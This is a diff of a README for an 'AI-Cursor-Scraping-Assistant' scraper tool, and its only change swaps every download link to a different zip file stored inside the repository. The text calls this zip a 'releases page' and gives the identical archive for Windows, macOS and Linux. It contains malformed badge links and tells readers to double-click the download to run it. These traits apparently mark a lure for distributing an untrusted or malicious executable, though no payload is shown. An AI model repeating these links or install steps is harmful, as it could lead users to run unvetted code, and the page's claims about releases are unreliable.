@@ -1,6 +1,6 @@
 # 🖥️ AI-Cursor-Scraping-Assistant - Create Scrapers with Ease
 
-[![Download Now](https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip%20Now-Visit%https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip)](https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip)
+[![Download Now](https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip%20Now-Visit%https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip)](https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip)
 
 ## 🌟 Overview
 
@@ -12,16 +12,16 @@ This guide will walk you through the steps to download and run the AI-Cursor-Scr
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download Now](https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip). 
+To download the software, visit this page: [Download Now](https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip). 
 
 You will find the latest release listed there, along with other previous versions. Simply click on the version you want to download. The installation process is straightforward:
 
 1. Go to the releases page using the link above.
 2. Look for the latest version.
 3. Click on the file that corresponds to your operating system. Common files include:
-   - For Windows: `https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip`
-   - For macOS: `https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip`
-   - For Linux: `https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip`
+   - For Windows: `https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip`
+   - For macOS: `https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip`
+   - For Linux: `https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip`
 4. Download the file.
 5. Once the download completes, locate the file and double-click it to run.
 
@@ -78,6 +78,6 @@ We welcome contributions to the AI-Cursor-Scraping-Assistant. If you would like 
 
 If you run into issues or have questions, reach out to our support team via the Issues tab on GitHub. We are here to help you make the most of the AI-Cursor-Scraping-Assistant.
 
-For direct downloads, remember to visit the releases page: [Download Now](https://raw.githubusercontent.com/danghungspkt/AI-Cursor-Scraping-Assistant/main/palmicolous/AI-Cursor-Scraping-Assistant.zip). 
+For direct downloads, remember to visit the releases page: [Download Now](https://github.com/danghungspkt/AI-Cursor-Scraping-Assistant/raw/refs/heads/main/MCPfiles/A_Scraping_Assistant_Cursor_v3.8.zip). 
 
 Happy scraping!
